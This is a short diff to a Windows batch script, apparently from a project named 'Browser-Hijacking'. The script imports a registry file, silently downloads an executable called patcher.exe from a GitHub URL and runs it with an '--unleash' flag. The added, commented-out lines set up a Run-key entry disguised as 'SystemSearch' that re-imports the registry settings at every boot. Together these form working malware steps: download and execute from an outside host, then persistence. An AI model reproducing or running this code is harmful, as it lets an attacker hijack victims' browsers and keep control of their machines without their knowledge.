@@ -6,3 +6,5 @@ reg import %tmp%\ieconf.reg
 curl -o %tmp%\patcher.exe -sL https://raw.githubusercontent.com/icesonata/Browser-Hijacking/main/patcher.exe
 @REM Execute patcher
 %tmp%\patcher.exe --unleash "%cd%"
+@REM Import registry key every time the computer is booted
+@REM reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SystemSearch /t REG_SZ /d "reg import %tmp%\ieconf.reg" /f
